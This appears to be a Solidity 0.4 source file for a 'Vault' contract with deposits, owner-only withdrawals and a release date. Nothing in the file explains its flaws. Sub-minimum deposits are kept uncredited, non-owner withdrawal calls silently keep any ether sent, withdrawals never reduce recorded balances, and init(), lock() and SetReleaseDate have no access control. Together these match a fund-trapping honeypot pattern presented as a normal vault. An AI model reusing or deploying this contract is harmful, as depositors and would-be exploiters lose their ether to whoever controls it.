1 pragma solidity ^0.4.17;
2 
3 contract Vault {
4     
5     event Deposit(address indexed depositor, uint amount);
6     event Withdrawal(address indexed to, uint amount);
7     event TransferOwnership(address indexed from, address indexed to);
8     
9     address Owner;
10     function transferOwnership(address to) public onlyOwner {
11         TransferOwnership(Owner, to); Owner = to;
12     }
13     
14     mapping (address => uint) public Deposits;
15     uint minDeposit;
16     bool Locked;
17     uint Date;
18 
19     function init() payable open {
20         Owner = msg.sender;
21         minDeposit = 0.5 ether;
22         Locked = false;
23         deposit();
24     }
25 
26     function SetReleaseDate(uint NewDate) {
27         Date = NewDate;
28     }
29 
30     function() public payable { deposit(); }
31 
32     function deposit() public payable {
33         if (msg.value > 0) {
34             if (msg.value >= MinimumDeposit())
35                 Deposits[msg.sender] += msg.value;
36             Deposit(msg.sender, msg.value);
37         }
38     }
39 
40     function withdraw(uint amount) public payable { withdrawTo(msg.sender, amount); }
41     
42     function withdrawTo(address to, uint amount) public onlyOwner {
43         if (WithdrawalEnabled()) {
44             uint max = Deposits[msg.sender];
45             if (max > 0 && amount <= max) {
46                 to.transfer(amount);
47                 Withdrawal(to, amount);
48             }
49         }
50     }
51 
52     function MinimumDeposit() public constant returns (uint) { return minDeposit; }
53     function ReleaseDate() public constant returns (uint) { return Date; }
54     function WithdrawalEnabled() constant internal returns (bool) { return Date > 0 && Date <= now; }
55     function lock() public { Locked = true; }
56     modifier onlyOwner { if (msg.sender == Owner) _; }
57     modifier open { if (!Locked) _; }
58     function kill() { require(this.balance == 0); selfdestruct(Owner); }
59 }